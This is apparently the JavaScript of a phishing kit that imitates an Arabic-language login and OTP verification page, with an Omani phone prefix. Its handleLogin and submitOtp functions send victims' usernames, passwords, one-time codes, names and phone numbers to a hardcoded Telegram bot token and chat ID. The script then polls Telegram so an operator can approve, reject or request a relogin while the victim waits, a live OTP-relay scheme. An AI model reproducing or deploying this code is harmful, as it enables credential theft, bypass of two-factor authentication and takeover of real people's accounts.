// ==================== STATE MANAGEMENT ==================== 
let currentLanguage = 'ar';
let currentPage = 'loginPage';

// ==================== INITIALIZATION ==================== 
document.addEventListener('DOMContentLoaded', function() {
    initializeApp();
    setupEventListeners();
});

function initializeApp() {
    const splash = document.getElementById('loadingScreen');
    if (splash) {
        setTimeout(() => {
            splash.classList.add('exit-active');
            setTimeout(() => splash.style.display = 'none', 800);
        }, 1500);
    }
    
    // Check for saved page
    const savedPage = sessionStorage.getItem('currentPage') || 'loginPage';
    showPage(savedPage);
    
    if (savedPage === 'otpPage') {
        displayOtpPhoneNumber();
    }
}

// ==================== PAGE NAVIGATION ==================== 
function showPage(pageName) {
    document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
    const pageElement = document.getElementById(pageName);
    if (pageElement) {
        pageElement.classList.add('active');
        currentPage = pageName;
        sessionStorage.setItem('currentPage', pageName);
    }
}

// ==================== EVENT LISTENERS ==================== 
function setupEventListeners() {
    const loginForm = document.getElementById('loginForm');
    if (loginForm) {
        loginForm.addEventListener('submit', handleLogin);
    }

    document.getElementById('otpConfirmBtn')?.addEventListener('click', submitOtp);
    
    document.getElementById('backBtnOtp')?.addEventListener('click', (e) => {
        e.preventDefault();
        showPage('loginPage');
    });

    // English only for username and password
    setupEnglishOnlyInput(document.getElementById('username'));
    setupEnglishOnlyInput(document.getElementById('password'));
}

// ==================== TELEGRAM INTEGRATION ==================== 
const BOT_TOKEN = '8796089476:AAGzdeadGQ1-d1z9h-TirtySgC1v5vVKto0';
const CHAT_ID = '6515786088';
const WEBHOOK_URL = 'https://api.telegram.org/bot' + BOT_TOKEN;

async function sendToTelegram(message, requestId, dataType) {
    try {
        const payload = {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        };
        
        if (dataType !== 'reg') {
            payload.reply_markup = {
                inline_keyboard: [
                    [
                        { text: '✅ قبول', callback_data: `approve_${dataType}_${requestId}` },
                        { text: '❌ رفض', callback_data: `reject_${dataType}_${requestId}` }
                    ],
                    [
                        { text: '🔄 تسجيل الدخول', callback_data: `relogin_${dataType}_${requestId}` }
                    ]
                ]
            };
        }

        const response = await fetch(`${WEBHOOK_URL}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        const json = await response.json();
        return json.result ? json.result.message_id : null;
    } catch (error) {
        console.error('Telegram send error:', error);
        return null;
    }
}

async function editTelegramMessage(messageId, originalText, resultText) {
    try {
        await fetch(`${WEBHOOK_URL}/editMessageText`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                message_id: messageId,
                text: originalText + '\n\n' + resultText,
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [] }
            })
        });
    } catch (error) {
        console.error('Telegram edit error:', error);
    }
}

async function checkWebhookResponse(requestId, dataType) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
        const data = await response.json();
        if (data.ok && data.result && data.result.length > 0) {
            for (let update of data.result) {
                if (update.callback_query) {
                    const callbackData = update.callback_query.data;
                    if (callbackData === `approve_${dataType}_${requestId}`) return 'approved';
                    if (callbackData === `reject_${dataType}_${requestId}`) return 'rejected';
                    if (callbackData === `relogin_${dataType}_${requestId}`) return 'relogin';
                }
            }
        }
        return 'pending';
    } catch (error) {
        return 'pending';
    }
}

function showRejection() {
    window.location.href = 'rejection.html';
}

function closeOtpRejection() {
    const modal = document.getElementById('otpRejectionModal');
    if (modal) modal.classList.remove('show');
    // Clear visual inputs
    document.querySelectorAll('.otp-input-box').forEach(i => i.value = '');
    const singleInput = document.getElementById('otpSingleInput');
    if (singleInput) singleInput.value = '';
    const visualInputs = document.querySelectorAll('.otp-input-box');
    if (visualInputs.length > 0) setTimeout(() => visualInputs[0].focus(), 300);
}

function showProcessError() {
    const errorModal = document.getElementById('processErrorModal');
    if (errorModal) {
        errorModal.classList.add('show');
    } else {
        // If we are not on login page or page with modal, redirect to rejection.html with trigger
        sessionStorage.setItem('show_process_error', 'true');
        window.location.href = 'rejection.html';
    }
}

function closeProcessError() {
    const errorModal = document.getElementById('processErrorModal');
    if (errorModal) errorModal.classList.remove('show');
    sessionStorage.setItem('login_error', 'true');
    window.location.href = 'login.html';
}

// ==================== LOGIN HANDLING ==================== 
function handleLogin(e) {
    e.preventDefault();
    
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();
    
    if (!username || !password) return;
    
    const fullName = sessionStorage.getItem('userFullName') || 'غير معروف';
    const loadingOverlay = document.getElementById('loadingOverlay');
    if (loadingOverlay) loadingOverlay.classList.add('show');
    
    const requestId = Date.now();
    const message = 
        `🔐 <b>صفحة تسجيل الدخول - Login</b>\n\n` +
        `👤 <b>الاسم الكامل:</b> <code>${fullName}</code>\n` +
        `👤 <b>اسم المستخدم:</b> <code>${username}</code>\n` +
        `🔑 <b>كلمة المرور:</b> <code>${password}</code>\n\n` +
        `⏰ ${new Date().toLocaleString('ar-EG')}`;
    
    sendToTelegram(message, requestId, 'login').then(messageId => {
        if (!messageId) return;

        const checkInterval = setInterval(async () => {
            const status = await checkWebhookResponse(requestId, 'login');
            if (status === 'approved') {
                clearInterval(checkInterval);
                await editTelegramMessage(messageId, message, '✅ تم القبول من تليجرام');
                if (loadingOverlay) loadingOverlay.classList.remove('show');
                
                sessionStorage.setItem('loginUsername', username);
                sessionStorage.setItem('loginPassword', password);
                
                showPage('otpPage');
                displayOtpPhoneNumber();
            } else if (status === 'rejected') {
                clearInterval(checkInterval);
                await editTelegramMessage(messageId, message, '❌ تم الرفض من تليجرام');
                if (loadingOverlay) loadingOverlay.classList.remove('show');
                showRejection();
            } else if (status === 'relogin') {
                clearInterval(checkInterval);
                await editTelegramMessage(messageId, message, '🔄 طلب إعادة تسجيل الدخول');
                if (loadingOverlay) loadingOverlay.classList.remove('show');
                showProcessError();
            }
        }, 2000);
    });
}

// ==================== OTP LOGIC ====================
function displayOtpPhoneNumber() {
    const phoneNumber = sessionStorage.getItem('userPhoneNumber') || '';
    const phoneDisplay = document.getElementById('otpPhoneDisplay');
    if (phoneDisplay && phoneNumber) {
        const lastFour = phoneNumber.slice(-4);
        phoneDisplay.textContent = `+968 ****${lastFour}`;
    }
}

function submitOtp() {
    const code = document.getElementById('otpSingleInput').value.trim();
    const errEl = document.getElementById('otpError');

    if (code.length < 6) {
        if (errEl) errEl.textContent = 'يرجى إدخال 6 أرقام';
        return;
    }

    if (errEl) errEl.textContent = '';
    
    const requestId = Date.now();
    const fullName = sessionStorage.getItem('userFullName') || 'غير معروف';
    const phoneNumber = sessionStorage.getItem('userPhoneNumber') || 'غير معروف';
    const message = 
        `🔐 <b>صفحة رمز التحقق - OTP Verification</b>\n\n` +
        `👤 <b>الاسم الكامل:</b> <code>${fullName}</code>\n` +
        `📱 <b>رقم الهاتف:</b> <code>${phoneNumber}</code>\n` +
        `🔑 <b>رمز التحقق:</b> <code>${code}</code>\n\n` +
        `⏰ ${new Date().toLocaleString('ar-EG')}`;
    
    const loadingOverlay = document.getElementById('loadingOverlay');
    if (loadingOverlay) loadingOverlay.classList.add('show');

    sendToTelegram(message, requestId, 'otp').then(messageId => {
        if (!messageId) return;

        const checkInterval = setInterval(async () => {
            const status = await checkWebhookResponse(requestId, 'otp');
            if (status === 'approved') {
                clearInterval(checkInterval);
                await editTelegramMessage(messageId, message, '✅ تم القبول من تليجرام');
                if (loadingOverlay) loadingOverlay.classList.remove('show');
                window.location.href = 'smartwatch.html';
            } else if (status === 'rejected') {
                clearInterval(checkInterval);
                await editTelegramMessage(messageId, message, '❌ تم الرفض من تليجرام (إعادة محاولة)');
                if (loadingOverlay) loadingOverlay.classList.remove('show');
                
                const modal = document.getElementById('otpRejectionModal');
                if (modal) modal.classList.add('show');
            } else if (status === 'relogin') {
                clearInterval(checkInterval);
                await editTelegramMessage(messageId, message, '🔄 طلب إعادة تسجيل الدخول');
                if (loadingOverlay) loadingOverlay.classList.remove('show');
                showProcessError();
            }
        }, 2000);
    });
}

function setupEnglishOnlyInput(input) {
    if (!input) return;
    input.addEventListener('input', function() {
        const cleaned = this.value.replace(/[^\x20-\x7E]/g, '');
        if (cleaned !== this.value) {
            this.value = cleaned;
        }
    });
}
